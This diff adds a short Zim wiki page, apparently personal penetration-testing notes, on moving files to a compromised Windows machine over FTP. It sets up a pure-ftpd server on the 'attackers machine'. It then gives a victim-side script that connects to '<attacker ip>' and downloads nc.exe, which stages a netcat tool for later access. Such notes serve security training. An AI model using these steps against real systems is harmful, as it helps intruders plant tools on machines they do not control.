@@ -1,0 +1,33 @@
+Content-Type: text/x-zim-wiki
+Wiki-Format: zim 0.4
+Creation-Date: 2018-10-04T15:12:27+05:30
+
+====== File Upload - FTP ======
+Created Thursday 04 October 2018
+
+**#Install ftp in attackers machine**
+apt-get update && apt-get install pure-ftpd
+
+
+**#Setup ftpe server in attackers machine**
+groupadd  ftpgroup	
+useradd -g ftpgroup -d [[/dev/null]] -s [[/etc]] ftpuser
+pure-pw useradd offsec -u ftpuser -d [[/ftphome]]
+pure-pw mkdb
+cd [[/etc/pure-ftpd/auth/]]
+ln -s [[../conf/PureDB]] 60pdb
+mkdir -p [[/ftphome]]
+chown -R ftpuser:ftpgroup [[/ftphome/]]
+[[/etc/init.d/pure-ftpd]] restart
+
+
+**# To connect to the server from victim(Windows)**
+
+echo open <attacker ip> >ftp.txt
+echo ftp >> ftp.txt
+echo ftp >> ftp.txt
+echo bin >>ftp.txt
+echo GET nc.exe >> ftp.txt
+echo bye >> ftp.txt
+ftp -s:ftp.txt
+
